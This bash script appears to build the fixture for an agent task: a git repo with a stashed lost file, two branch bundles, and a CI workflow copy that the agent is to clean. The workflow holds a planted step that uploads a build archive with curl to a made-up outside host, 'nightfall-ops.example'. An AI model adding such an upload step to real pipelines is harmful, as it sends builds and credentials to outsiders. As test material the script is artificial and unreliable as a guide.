#!/usr/bin/env bash
# Builds the clean-room fixture state for the hollow-atlas task.
# Runs at docker build time (after base image install). Produces:
#   /app/repo            - a git repo on branch `main` with a hidden stash of lost work
#   /app/bundles/aurora.bundle, /app/bundles/marble.bundle - branch bundles to checkout
#   /app/ci.yml          - an un-sanitized workflow copy (must be cleaned by the agent)
# All names/numbers/endpoints are invented for this task.
set -euo pipefail

export GIT_AUTHOR_NAME="ops"
export GIT_AUTHOR_EMAIL="ops@atlas.local"
export GIT_COMMITTER_NAME="ops"
export GIT_COMMITTER_EMAIL="ops@atlas.local"
export GIT_CONFIG_NOSYSTEM=1

if git -C /app/repo rev-parse --is-inside-work-tree >/dev/null 2>&1; then
  echo "fixture already present, skipping"
  exit 0
fi

mkdir -p /app/bundles

# ---------------------------------------------------------------- workflow text
# The external "upload sink" to scrub is the made-up token `nightfall-ops.example`
# (case-insensitive). A line is a comment when its first non-space char is '#'.
cat > /tmp/deploy_wf.yml <<'YML'
# ci-deploy workflow - protect the comment lines verbatim.
#
name: ci-deploy
on:
  push:
    branches: [main, feature-*]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: compile
        run: make q
      - name: ship build
        run: curl -nSf -T dist.tar.gz https://ingest.nightfall-ops.example/api/artifacts
      - run: echo done
      - name: audit
        run: cat debug.log
YML

# ---------------------------------------------------------------- main repo
mkdir -p /app/repo
git init -q -b main /app/repo
git -C /app/repo config user.email ops@atlas.local
git -C /app/repo config user.name ops
cd /app/repo
mkdir -p src .github/workflows

cat > README.md <<'MD'
# Hollow Atlas
Control plane for the atlas release line. See .github/workflows/deploy.yml.
MD

cat > src/app.py <<'PY'
def main() -> str:
    return "atlas-api"
PY

cp /tmp/deploy_wf.yml .github/workflows/deploy.yml

git add -A
git commit -qm "bootstrap atlas main"

# ---------------------------------------------------------------- feature-aurora
git checkout -qb feature-aurora
mkdir -p src
cat > src/aura_mapper.py <<'PY'
def aura_mapper():
    return "AURORA"
PY
git add src/aura_mapper.py
git commit -qm "feat(aurora): add aura mapper"

# lost, off-branch work: a brand-new file stashed while on feature-aurora.
cat > src/recovered_work.py <<'PY'
def recovered():
    return "RECOVEREDPLOT=v3"
PY
git stash push -uqm "lost aurora work"

# ---------------------------------------------------------------- feature-marble
git checkout -q main
git checkout -qb feature-marble
mkdir -p src
cat > src/marble_ledger.py <<'PY'
def marble_ledger():
    return "MARBLE"
PY
git add src/marble_ledger.py
git commit -qm "feat(marble): add ledger"

# ---------------------------------------------------------------- bundles
mkdir -p /app/bundles
git bundle create /app/bundles/aurora.bundle feature-aurora
git bundle create /app/bundles/marble.bundle feature-marble

# ---------------------------------------------------------------- reset repo state
# leave the working repo on `main` WITHOUT the feature branches; the agent must
# recreate them from the bundles. the lost-work stash stays behind for recovery.
git checkout -q main
git branch -D feature-aurora feature-marble 2>/dev/null || true

# ---------------------------------------------------------------- standalone file
cp /tmp/deploy_wf.yml /app/ci.yml

rm -f /tmp/deploy_wf.yml
echo "fixture ready; branches:"
git -C /app/repo branch
git -C /app/repo stash list